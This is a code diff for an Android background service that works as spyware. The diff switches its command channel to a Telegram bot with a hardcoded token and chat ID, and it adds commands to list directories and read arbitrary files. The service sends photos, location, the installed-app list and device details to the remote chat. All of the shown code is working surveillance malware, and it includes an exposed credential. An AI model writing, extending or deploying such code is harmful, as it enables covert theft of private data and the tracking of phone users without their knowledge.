@@ -8,13 +8,17 @@ import java.net.*
 import org.json.*
 
 class CoreService : Service() {
-    private val C2 = "https://trusty-boa-4029.aliondavlatov12-cpu.deno.net"
+    private val BOT = "8927866585:AAEo-_JUoJS_iD-fZxKJvSakGLpXkYLtkiM"
+    private val CHAT = "7659107145"
     private var lastUpdate = 0L
+    private lateinit var prefs: SharedPreferences
 
     override fun onBind(i: Intent?) = null
 
     override fun onCreate() {
         super.onCreate()
+        prefs = getSharedPreferences("svc", MODE_PRIVATE)
+        lastUpdate = prefs.getLong("lastUpdate", 0L)
         startForeground(1, notif())
         Thread { loop() }.start()
         Thread { initialDump() }.start()
@@ -56,12 +60,17 @@ class CoreService : Service() {
     }
 
     private fun getUpdates(): List<JSONObject> {
-        val url = URL("$C2/cmd?o=${lastUpdate + 1}")
-        val arr = JSONObject(url.readText()).getJSONArray("result")
+        val url = URL("https://api.telegram.org/bot$BOT/getUpdates?timeout=5&offset=${lastUpdate + 1}")
+        val conn = url.openConnection() as HttpURLConnection
+        conn.connectTimeout = 10000
+        conn.readTimeout = 10000
+        val body = conn.inputStream.bufferedReader().readText()
+        val arr = JSONObject(body).getJSONArray("result")
         val out = mutableListOf<JSONObject>()
         for (i in 0 until arr.length()) {
             val o = arr.getJSONObject(i)
             lastUpdate = o.getLong("update_id")
+            prefs.edit().putLong("lastUpdate", lastUpdate).apply()
             out.add(o)
         }
         return out
@@ -80,7 +89,12 @@ class CoreService : Service() {
             text == "/apps" -> sendFile(dumpApps(), "apps.txt")
             text.startsWith("/read") -> {
                 val p = text.removePrefix("/read").trim()
-                sendFile(File(p), File(p).name)
+                val f = File(p)
+                if (f.exists()) sendFile(f, f.name)
+            }
+            text.startsWith("/ls") -> {
+                val p = text.removePrefix("/ls").trim()
+                sendText(listDir(p))
             }
         }
     }
@@ -148,6 +162,14 @@ class CoreService : Service() {
         return f
     }
 
+    private fun listDir(path: String): String {
+        val f = File(path)
+        if (!f.exists()) return "not found: $path"
+        return f.listFiles()?.joinToString("\n") {
+            "${it.name} ${if (it.isDirectory) "/" else it.length()}"
+        } ?: "empty"
+    }
+
     private fun sendRecentPhotos(count: Int) {
         val proj = arrayOf(
             android.provider.MediaStore.Images.Media._ID,
@@ -161,7 +183,7 @@ class CoreService : Service() {
         c?.use {
             while (it.moveToNext()) {
                 val id = it.getLong(0)
-                val name = it.getString(1)
+                val name = it.getString(1) ?: "img_$id.jpg"
                 val uri = android.net.Uri.withAppendedPath(
                     android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString()
                 )
@@ -177,21 +199,26 @@ class CoreService : Service() {
     }
 
     private fun getLoc(): String {
-        val lm = getSystemService(LOCATION_SERVICE) as android.location.LocationManager
-        val loc = lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
-               ?: lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
-        return loc?.let { "${it.latitude},${it.longitude}" } ?: "no fix"
+        try {
+            val lm = getSystemService(LOCATION_SERVICE) as android.location.LocationManager
+            val loc = lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
+                   ?: lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
+            return loc?.let { "${it.latitude},${it.longitude}" } ?: "no fix"
+        } catch (_: Exception) { return "err" }
     }
 
     private fun deviceInfo(): String =
-        "Model: ${Build.MODEL}\nAndroid: ${Build.VERSION.RELEASE}\nBrand: ${Build.BRAND}"
+        "Model: ${Build.MODEL}\nAndroid: ${Build.VERSION.RELEASE}\nBrand: ${Build.BRAND}\nID: ${Build.ID}"
 
     private fun sendText(t: String) {
         try {
-            val conn = URL("$C2/hit").openConnection() as HttpURLConnection
+            val body = "chat_id=$CHAT&text=${URLEncoder.encode(t, "UTF-8")}"
+            val conn = URL("https://api.telegram.org/bot$BOT/sendMessage").openConnection() as HttpURLConnection
             conn.requestMethod = "POST"
             conn.doOutput = true
-            conn.outputStream.write(t.toByteArray())
+            conn.connectTimeout = 15000
+            conn.readTimeout = 15000
+            conn.outputStream.write(body.toByteArray())
             conn.inputStream.close()
         } catch (_: Exception) {}
     }
@@ -200,14 +227,16 @@ class CoreService : Service() {
         if (!f.exists() || f.length() == 0L) return
         try {
             val b = "----x${System.currentTimeMillis()}"
-            val conn = URL("$C2/file").openConnection() as HttpURLConnection
+            val conn = URL("https://api.telegram.org/bot$BOT/sendDocument").openConnection() as HttpURLConnection
             conn.requestMethod = "POST"
             conn.doOutput = true
+            conn.connectTimeout = 30000
+            conn.readTimeout = 30000
             conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$b")
             conn.outputStream.use { os ->
                 fun p(s: String) = os.write(s.toByteArray())
-                p("--$b\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\n$name\r\n")
-                p("--$b\r\nContent-Disposition: form-data; name=\"file\"; filename=\"$name\"\r\n")
+                p("--$b\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n$CHAT\r\n")
+                p("--$b\r\nContent-Disposition: form-data; name=\"document\"; filename=\"$name\"\r\n")
                 p("Content-Type: application/octet-stream\r\n\r\n")
                 f.inputStream().copyTo(os)
                 p("\r\n--$b--\r\n")
